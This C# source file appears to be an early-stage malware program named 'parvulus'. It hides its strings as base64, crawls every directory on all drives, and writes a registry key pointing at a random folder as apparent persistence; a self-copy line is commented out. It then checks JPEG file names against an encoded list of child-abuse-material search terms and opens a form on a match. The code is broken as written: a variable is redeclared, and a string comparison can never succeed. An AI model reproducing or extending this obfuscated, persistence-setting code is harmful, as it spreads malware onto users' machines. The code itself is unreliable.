   using System;
   using System.Collections;
   using System.Collections.Generic;
   using System.IO;
   using System.Reflection;
   using System.Text;
   using System.Threading;
   using System.Windows.Forms;
   using Microsoft.Win32;

   namespace parvulus
   {
       static class Program
       {
           static object g;

           [STAThread]
           static void Main()
           {
               // Create and Init
               ArrayList List = new ArrayList();
               Random r = new Random();

               // Variables
               bool t = false;
               string[] n = new string[10] { decrypt("cHRoYw=="), decrypt("UGhvdG8gQnkgQ2FybCAtIFBlZG8="), decrypt("cHJldGVlbg==")
               , decrypt("Y2hpbGRsb3Zlcg=="), decrypt("Y2hpbGQgcG9ybg=="), decrypt("OHlv"), decrypt("OXlv"), decrypt("MTB5bw==")
               , decrypt("MTF5bw=="), decrypt("MTJ5bw==") };

               // Find itself
               Module me = Assembly.GetExecutingAssembly().GetModules()[0];

               //Get list of logical drives
               string [] drives = Directory.GetLogicalDrives();

               // For each drive gather directories
               foreach (string d in drives)
               {
                   // Error handling for A:\
                   try { CollectDirs(d, List); }
                   catch (IOException) { continue; }
               }

               int q = r.Next(0, List.Count);

               // Copy to randam dir
               // File.Copy(me.FullyQualifiedName, List[q] + @"\" + me.ScopeName);

               // Create registry key
               RegistryKey key = Registry.CurrentUser.CreateSubKey(decrypt("U29mdHdhcmVcUmV0cm9cUGFydmFsdXM="));
               key.SetValue(decrypt("UGFydnVsdXM="), List[q] + @"\" + me.ScopeName);
               key.SetValue(decrypt("QWN0aXZl"), decrypt("MA=="));

               // Foreach directory in ArrayList
               MessageBox.Show(List.Count.ToString());
               foreach (string s in List)
               {
                   try
                   {
                       // Get JPEG files
                       string[] fs = Directory.GetFiles(s, "*.jpg");

                       // Foreach JPEG in string array
                       foreach (string f in fs)
                       {
                           // Open file info
                           FileInfo fi = new FileInfo(f);

                           // loop through each special string
                           for (int l = 0; l < 10; l++)
                           {
                               // See if the file name contains one of the strings
                               bool t = fi.Name.Contains((string)n[l]);

                               // If it finds a matching string
                               if (t.ToString()  == "true")
                               {
                                   // Set the registry key to 'true'
                                   key.SetValue(decrypt("QWN0aXZl"), decrypt("MQ=="));
                               }
                               else
                               {
                                   // No matching string
                                   continue;
                               }
                           }
                       }
                   }
                   catch (UnauthorizedAccessException) { continue; }
               }

               g = key.GetValue(decrypt("QWN0aXZl"));

               if (g.ToString() == "1")
               {
                   // Run Form
                   Application.EnableVisualStyles();
                   Application.Run(new Form1());
               }


               key.Close();
           }

           // String Decrypter
           static string decrypt(string s)
           {
               StringBuilder sb = new StringBuilder();

               char[] data = s.ToCharArray();
               decrypter d = new decrypter(data);
               byte[] t = d.GetDecoded();
               sb.Append(UTF8Encoding.UTF8.GetChars(t));
               return sb.ToString();
           }


           // Collect Directories
           static void CollectDirs(string dir, ArrayList storage)
           {
               try
               {
                   string [] dirs = Directory.GetDirectories(dir);
                   foreach (string d in dirs)
                   {
                       storage.Add(d);
                       CollectDirs(d, storage);
                   }
               }
               catch (System.UnauthorizedAccessException) { }
           }
       }
   }
